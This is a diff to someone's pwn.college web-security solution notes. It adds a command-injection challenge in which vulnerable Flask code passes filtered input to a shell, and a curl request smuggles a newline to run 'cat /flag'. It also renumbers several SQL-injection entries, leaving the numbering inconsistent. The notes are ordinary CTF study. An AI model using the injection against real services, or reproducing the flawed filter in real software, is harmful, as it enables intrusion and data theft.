@@ -1359,7 +1359,53 @@ HINT: If you're wondering why your solution isn't working, make sure what you're
     pwn.college{YFNeZ9Qv6G3Ayx3WpUe13_anpVN.QX3gzMzwiNxQjMyEzW}
     * shutting down connection #0
 
-12. SQLi 2
+8. CMDi 6
+    Sometimes, developers try very hard to filter out potentially dangerous characters. The success in this challenge is almost perfect, but not quite... You'll be stumped for a while, but will laugh at its familiarity when you figure out the solution!
+
+   - my solution:
+        ...
+        app.route("/goal", methods=["GET"])
+        def challenge():
+            arg = (
+                flask.request.args.get("subdirectory", "/challenge")
+                .replace(";", "")
+                .replace("&", "")
+                .replace("|", "")
+                .replace(">", "")
+                .replace("<", "")
+                .replace("(", "")
+                .replace(")", "")
+                .replace("`", "")
+                .replace("$", "")
+            )
+            command = f"ls -l {arg}"
+
+            print(f"DEBUG: {command=}")
+            result = subprocess.run(
+                command,  # the command to run
+                shell=True,  # use the shell to run this command
+                stdout=subprocess.PIPE,  # capture the standard output
+                stderr=subprocess.STDOUT,  # 2>&1
+                encoding="latin",  # capture the resulting output as text
+            ).stdout
+            ...
+
+            hacker@web-security~cmcurl http://challenge.localhost:80/goal?subdirectory=flag%0Acat%20%2Fflag
+
+                    <html><body>
+                    Welcome to the dirlister service! Please choose a directory to list the files of:
+                    <form action="/goal"><input type=text name=subdirectory><input type=submit value=Submit></form>
+                    <hr>
+                    <b>Output of ls -l flag
+            cat /flag:</b><br>
+                    <pre>ls: cannot access 'flag': No such file or directory
+            pwn.college{Yf_FhrKOaXdQizViyQwmFE6heEY.QX0cTN2wiNxQjMyEzW}
+            </pre>
+                    </body></html>
+                    hacker@web-security~cmdi-6:~$ 
+
+
+9.  SQLi 2
 
     The previous level's SQL injection was quite simple to pull off and still have a valid SQL query. This was, in part, because your injection happened at the very end of the query. In this level, however, your injection happens partway through, and there is (a bit) more of the SQL query afterwards. This complicates matters, because the query must remain valid despite your injection.
 
@@ -1369,7 +1415,7 @@ HINT: If you're wondering why your solution isn't working, make sure what you're
       - use `--` to comment out trailing characters to avoid error
 ![alt text](image.png)
 
-13. SQLi 3
+1.  SQLi 3
     If you recall, your command injection exploits typically caused additional commands to be executed. So far, your SQL injections have simply modified the conditions of existing SQL queries. However, similar to how the shell has ways to chain commands (e.g., ;, |, etc), some SQL queries can be chained as well!
 
     An attacker's ability to chain SQL queries has extremely powerful potential. For example, it allows the attacker to query completely unintended tables or completely unintended fields in tables, and leads to the types of massive data disclosures that you read about on the news.
@@ -1469,7 +1515,7 @@ HINT: If you're wondering why your solution isn't working, make sure what you're
         password
         pwn.college{4KLg1LTfhiP21IqEZxa55ItCKsE.QXykzMzwiNxQjMyEzW}
 
-        
+
 
 15. SQLi 5
 
